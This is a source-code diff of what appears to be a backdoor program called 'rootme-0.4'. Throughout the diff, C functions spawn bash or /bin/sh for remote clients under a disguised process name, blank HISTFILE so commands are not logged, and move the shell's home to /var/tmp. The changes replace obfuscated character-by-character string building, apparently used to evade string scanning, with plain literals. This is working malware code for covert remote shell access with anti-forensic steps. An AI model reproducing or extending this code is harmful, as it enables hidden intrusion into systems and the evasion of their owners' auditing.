@@ -147,7 +147,6 @@ void shell_spooler(void)
 
 	    if (!(pid = fork())) {
 		int i;
-		char r_banner[17];
 
 		/* close all unnecessary descriptors */
 
@@ -159,24 +158,7 @@ void shell_spooler(void)
 		    close(i);
 		}
 
-		r_banner[0] = 'r';
-		r_banner[8] = '.';
-		r_banner[1] = 'o';
-		r_banner[9] = '3';
-		r_banner[2] = 'o';
-		r_banner[10] = ' ';
-		r_banner[3] = 't';
-		r_banner[11] = 'r';
-		r_banner[4] = 'm';
-		r_banner[12] = 'e';
-		r_banner[5] = 'e';
-		r_banner[13] = 'a';
-		r_banner[6] = '-';
-		r_banner[14] = 'd';
-		r_banner[7] = '0';
-		r_banner[15] = 'y';
-
-		if (write(pipe_B[x][1], r_banner, 16) < 0) {
+		if (write(pipe_B[x][1], "rootme-0.4 ready", 16) < 0) {
 		    exit(0);
 		}
 
@@ -274,29 +256,13 @@ void process_client(int get_type, int client_fd)
 
 void runshell_raw(int rd_pipe, int wr_pipe)
 {
-    char shell_path[8];
-
     setsid();
     dup2(rd_pipe, 0);
     dup2(wr_pipe, 1);
     dup2(wr_pipe, 2);
 
-    shell_path[0] = 'b';
-    shell_path[2] = 's';
-    shell_path[1] = 'a';
-    shell_path[3] = 'h';
-    shell_path[4] = '\0';
-    execlp(shell_path, HIDE_SHELL, (char *) 0);
-
-    shell_path[0] = '/';
-    shell_path[4] = '/';
-    shell_path[1] = 'b';
-    shell_path[5] = 's';
-    shell_path[2] = 'i';
-    shell_path[6] = 'h';
-    shell_path[3] = 'n';
-    shell_path[7] = '\0';
-    execlp(shell_path, HIDE_SHELL, (char *) 0);
+    execlp("bash", HIDE_SHELL, (char *) 0);
+    execlp("/bin/sh", HIDE_SHELL, (char *) 0);
 
     return;
 }
@@ -384,12 +350,7 @@ void runshell_pty(int rd_pipe, int wr_pipe)
     if (!(temp = (char *) malloc(66)))
 	return;
 
-    temp[0] = 'T';
-    temp[3] = 'M';
-    temp[1] = 'E';
-    temp[4] = '=';
-    temp[2] = 'R';
-
+    strncpy(temp, "TERM=", strlen("TERM="));
     strncpy(temp + 5, buffer + 4, 61);
 
     putenv(temp);
@@ -438,71 +399,18 @@ void runshell_pty(int rd_pipe, int wr_pipe)
 	    close(tty);
 
 	/* just in case bash is run, kill the history file */
-
-	if (!(temp = (char *) malloc(10)))
-	    return;
-
-	temp[0] = 'H';
-	temp[5] = 'I';
-	temp[1] = 'I';
-	temp[6] = 'L';
-	temp[2] = 'S';
-	temp[7] = 'E';
-	temp[3] = 'T';
-	temp[8] = '=';
-	temp[4] = 'F';
-	temp[9] = '\0';
-
-	putenv(temp);
-
-        free(temp);
+	putenv("HISTFILE=");
 
 	/* set HOME to "/var/tmp" */
-
-	if (!(temp = (char *) malloc(14)))
-	    return;
-
-	temp[0] = 'H';
-	temp[7] = 'a';
-	temp[1] = 'O';
-	temp[8] = 'r';
-	temp[2] = 'M';
-	temp[9] = '/';
-	temp[3] = 'E';
-	temp[10] = 't';
-	temp[4] = '=';
-	temp[11] = 'm';
-	temp[5] = '/';
-	temp[12] = 'p';
-	temp[6] = 'v';
-	temp[13] = '\0';
-
-	putenv(temp);
+	putenv("HOME=/var/tmp");
         
-	if (chdir(temp + 5) < 0) {
+	if (chdir("/var/tmp") < 0) {
 	    exit(0);
 	}
-
-        free(temp);
         
 	/* fire up the shell */
-
-	buffer[0] = 'b';
-	buffer[2] = 's';
-	buffer[1] = 'a';
-	buffer[3] = 'h';
-	buffer[4] = '\0';
-	execlp(buffer, HIDE_SHELL, (char *) 0);
-
-	buffer[0] = '/';
-	buffer[4] = '/';
-	buffer[1] = 'b';
-	buffer[5] = 's';
-	buffer[2] = 'i';
-	buffer[6] = 'h';
-	buffer[3] = 'n';
-	buffer[7] = '\0';
-	execlp(buffer, HIDE_SHELL, (char *) 0);
+	execlp("bash", HIDE_SHELL, (char *) 0);
+	execlp("/bin/sh", HIDE_SHELL, (char *) 0);
 
 	return;
     }
